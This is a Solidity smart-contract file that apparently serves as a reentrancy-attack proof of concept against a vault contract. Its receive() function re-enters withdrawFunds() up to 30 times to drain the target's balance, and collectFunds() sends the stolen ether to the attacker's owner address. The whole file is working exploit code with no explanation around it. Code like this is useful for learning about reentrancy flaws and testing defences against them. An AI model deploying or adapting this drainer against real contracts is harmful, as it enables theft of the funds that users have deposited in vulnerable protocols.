// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function withdrawFunds() external;
    function getBalance(address _account) external view returns (uint256);
    function getContractBalance() external view returns (uint256);
}

contract Attacker {

    IVault public immutable target;
    address public immutable owner;
    uint256 public constant MAX_REENTRIES = 30;
    uint256 public reentrancyCount;

    event AttackInitiated(address indexed target, uint256 attackerBalance);
    event ReentryTriggered(uint256 indexed iteration, uint256 targetBalance);
    event AttackCompleted(uint256 totalDrained);

    constructor(address _target) {
        require(_target != address(0), "Attacker: invalid target address");
        target = IVault(_target);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Attacker: only owner can initiate attack");
        require(
            target.getBalance(address(this)) > 0,
            "Attacker: no balance in target to withdraw"
        );

        reentrancyCount = 0;
        emit AttackInitiated(address(target), target.getContractBalance());
        target.withdrawFunds();
        emit AttackCompleted(address(this).balance);
    }

    receive() external payable {
        reentrancyCount++;
        uint256 targetBalance = target.getContractBalance();
        emit ReentryTriggered(reentrancyCount, targetBalance);
        if (targetBalance > 0 && reentrancyCount < MAX_REENTRIES) {
            target.withdrawFunds();
        }
    }

    function collectFunds() external {
        require(msg.sender == owner, "Attacker: only owner can collect funds");
        uint256 balance = address(this).balance;
        require(balance > 0, "Attacker: nothing to collect");

        (bool success, ) = owner.call{value: balance}("");
        require(success, "Attacker: collection transfer failed");
    }

    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getReentrancyCount() external view returns (uint256) {
        return reentrancyCount;
    }
}
